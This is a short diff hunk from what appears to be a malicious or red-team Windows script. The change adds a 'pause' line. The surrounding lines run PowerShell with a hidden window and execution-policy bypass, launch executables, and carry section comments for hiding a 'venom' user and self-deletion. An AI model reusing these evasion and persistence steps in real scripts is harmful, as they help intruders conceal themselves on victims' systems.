@@ -73,7 +73,7 @@ powershell powershell.exe -windowstyle hidden -ep bypass $path ./attempt1.exe
 .\attempt1.exe; ./calty2
 
 # hide venom user
-
+pause
 
 # self delete
 cd $initial_dir
